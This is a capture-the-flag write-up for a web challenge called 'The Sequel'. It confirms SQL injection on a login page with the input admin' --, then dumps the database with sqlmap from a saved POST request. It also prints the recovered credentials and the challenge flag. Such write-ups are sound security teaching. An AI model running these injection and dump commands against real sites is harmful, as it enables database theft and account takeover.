# Solution for The Sequel

Upon checking out the website, we see it's a simple login page. 

The name of the challenge hints about a SQL injection. So we try to enter some usernames such that server returns a mysql error, to verify
that the server is running SQL. We try: username = "admin' --" (without double quotes) which gives us an SQL error as expected:

![Screenshot_20220509_030254](https://user-images.githubusercontent.com/73381089/167316690-7de8b012-7867-4e37-bf35-c593e4c7b75c.png)

We can use the "sqlmap" tool to do the SQL injection for us. It can be found here: https://github.com/sqlmapproject/sqlmap

First, we save a demo login POST request which will be used as a reference by the "sqlmap". This can be done by trying to log in, 
and examining the POST request sent by the browser, and saving it to a file. Here's the request which I used:

```
POST /web/1/login.php HTTP/2
Host: web.ctf.devclub.in
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Origin: https://web.ctf.devclub.in
Connection: keep-alive
Referer: https://web.ctf.devclub.in/web/1/login.php
Cookie: PHPSESSID=jmmc4dck4ruhe0lot9h52isvm4
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
TE: trailers

username=aaa&password=aaa
```
Now, we run sqlmap: `python3 sqlmap -r dummy_request.txt -p username --dump`. It will then retrieve all the records in the SQL database on server via
SQL injection, and can even crack any passwords found via a dictionary attack.

![Screenshot_20220509_031428](https://user-images.githubusercontent.com/73381089/167317048-ed9fbe21-1757-4e10-82be-3e6ea4711636.png)

We get the credentials: username = "as1605" & password = "wildspirit"

We can then login and obtain the flag: CTF{7ql_1s_n0t_3asy_8_all}
